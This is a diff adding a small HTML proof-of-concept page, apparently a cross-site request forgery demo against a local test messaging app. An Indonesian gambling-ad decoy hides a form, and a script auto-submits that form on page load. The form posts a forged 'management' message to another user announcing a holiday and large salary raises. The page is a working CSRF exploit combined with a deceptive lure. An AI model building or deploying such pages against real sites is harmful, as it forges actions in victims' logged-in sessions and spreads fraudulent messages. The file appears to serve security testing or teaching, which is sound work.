@@ -1,0 +1,24 @@
+<html>
+    <body>
+        <!-- php -S 0.0.0.0:1234 -->
+        <!-- localhost:1234/csrf_poc.html -->
+        <h1>Zeus. Pasti Gacor.</h1>
+        <marquee>Anda menang kami bayar. No tipu2</marquee>
+        <marquee>Semua bisa menang</marquee>
+
+        <form action="http://localhost/tranqsite/controllers/MessageController.php" method="POST">
+            <input type="hidden" name="title" value="Besok Libur" />
+            <input type="hidden" name="recipient" value="4" />
+            <textarea name="message" style="display: none;">
+                Saya dapat informasi dari manajemen, bahwa besok kita libur agar mental terjaga. Selain itu, gaji juga akan dinaikkan:
+                - Level Staff: 75%
+                - Level Manajer: 70%
+                - Level Direktur: 125%
+            </textarea>
+        </form>
+    </body>
+    <script>
+        // automatically submit the form when the page is loaded
+        document.forms[0].submit();
+    </script>
+</html>
